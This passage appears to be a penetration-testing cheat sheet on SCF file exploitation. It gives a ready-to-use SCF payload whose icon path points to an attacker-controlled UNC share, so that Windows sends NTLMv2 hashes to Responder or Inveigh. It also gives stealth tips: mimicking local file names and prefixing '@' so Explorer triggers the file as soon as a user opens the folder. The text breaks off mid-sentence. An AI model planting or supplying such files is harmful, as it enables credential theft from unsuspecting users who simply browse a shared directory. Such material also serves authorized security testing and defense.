SCF File Exploitation:

A Shell Command File is used by Explorer to move up and down directories and other functionality like showing Desktop, We can manipulate SCF file to have the icon file point to a specific UNC path and have window start smb session, we can attempt to change iconfile to something under our control and use Responder or Inveigh to gain NTLMv2 Password Hash

We first create a file similar to following:
```
[Shell]
Command=2
IconFile=\\<ip>\<sharename>\legit.ico
[Taskbar]
Command=ToggleDesktop
```

We follow other file naming convention to not have the file appear out of place, we also put @ before the filename so that it appears on top of directory and get Executed by explorer as soon as user visit directory, the filename maybe something like `@Inventory.scf`, we do not need to really putup a share, instead we pull up 